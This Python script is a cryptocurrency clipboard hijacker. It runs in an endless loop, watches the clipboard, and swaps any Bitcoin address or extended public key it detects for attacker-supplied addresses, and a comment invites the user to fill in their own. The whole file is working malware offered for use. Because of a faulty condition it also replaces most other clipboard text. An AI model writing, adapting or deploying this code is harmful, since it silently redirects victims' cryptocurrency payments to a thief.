import pyperclip

from tkinter import Tk

# It's not important to complete all the addresses, just paste yours in the correct variable

btc_address_pubkey_hash_P2PKH = '1FfmbHfnpaZjKFvyi1okTjJJusN455paPH' # Pubkey hash (P2PKH address)

btc_address_script_hash_P2SH = '3EktnHQD7RiAE6uzMj2ZifT9YgRrkSgzQX' # Script hash (P2SH address) || SegWit Pay 2 Witness Public Key Hash (P2SH-P2WPKH)

btc_address_segwit_mainnet_P2WPKH  = 'bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4' # SegWit mainnet (P2WPKH address)

btc_address_segwit_testnet_P2WPKH = 'tb1qw508d6qejxtdg4y5r3zarvary0c5xw7kxpjzsx' # SegWit Testnet (P2WPKH address)

btc_address_segwit_mainnet_P2WSH = 'bc1qrp33g0q5c5txsp9arysrx4k6zdkfs4nce4xj0gdcccefvpysxf3qccfmv3' # SegWit mainnet (P2WSH address)

btc_address_segwit_testnet_P2WSH = 'tb1qrp33g0q5c5txsp9arysrx4k6zdkfs4nce4xj0gdcccefvpysxf3q0sl5k7' # SegWit Testnet (P2WSH address)

btc_address_BIP21_pubkey = 'xpub661MyMwAqRbcEYS8w7XLSVeEsBXy79zSzH1J8vCdxAZningWLdN3zgtU6LBpB85b3D2yc8sfvZU521AAwdZafEz7mnzBBsz4wKY5e4cp9LB' # BIP32 pubkey

btc_address_testnet_pubkey_hash = 'mipcBbFg9gMiCh81Kj8tqqdgoZub1ZJRfn' # Testnet pubkey hash

btc_address_testnet_script_hash = '2MzQwSSnBHWHqSAqtTVQ6v47XtaisrJa1Vc' # Testnet script hash

btc_address_testnet_BIP32_pubkey = 'tpubD6NzVbkrYhZ4WLczPJWReQycCJdd6YVWXubbVUFnJ5KgU5MDQrD998ZJLNGbhd2pq7ZtDiPYTfJ7iBenLVQpYgSQqPjUsQeJXH8VQ8xA67D' # Testnet BIP32 pubkey

while 1:

    clipboard_content = Tk().clipboard_get()

    if clipboard_content[0] == '1' and len(clipboard_content) == 34:

        pyperclip.copy(btc_address_pubkey_hash_P2PKH)

    elif clipboard_content[0] == '3' and len(clipboard_content) == 34:

        pyperclip.copy(btc_address_script_hash_P2SH)

    elif clipboard_content[0:3] == 'bc1' and len(clipboard_content) == 42:

        pyperclip.copy(btc_address_segwit_mainnet_P2WPKH)

    elif clipboard_content[0:3] == 'tb1' and len(clipboard_content) == 42:

        pyperclip.copy(btc_address_segwit_testnet_P2WPKH)

    elif clipboard_content[0:3] == 'bc1' and len(clipboard_content) == 62:

        pyperclip.copy(btc_address_segwit_mainnet_P2WSH)

    elif clipboard_content[0:3] == 'tb1' and len(clipboard_content) == 62:

        pyperclip.copy(btc_address_segwit_testnet_P2WSH)

    elif clipboard_content[0:4] == 'xpub' and len(clipboard_content) == 111:

        pyperclip.copy(btc_address_BIP21_pubkey)

    elif clipboard_content[0] == 'm' or 'n' and len(clipboard_content) == 34:

        pyperclip.copy(btc_address_testnet_pubkey_hash)

    elif clipboard_content[0] == '2' and len(clipboard_content) == 35:

        pyperclip.copy(btc_address_testnet_script_hash)

    elif clipboard_content[0:4] == 'tpub' and len(clipboard_content) == 111:

        pyperclip.copy(btc_address_testnet_BIP32_pubkey)

    else:

        pyperclip.copy(Tk().clipboard_get())
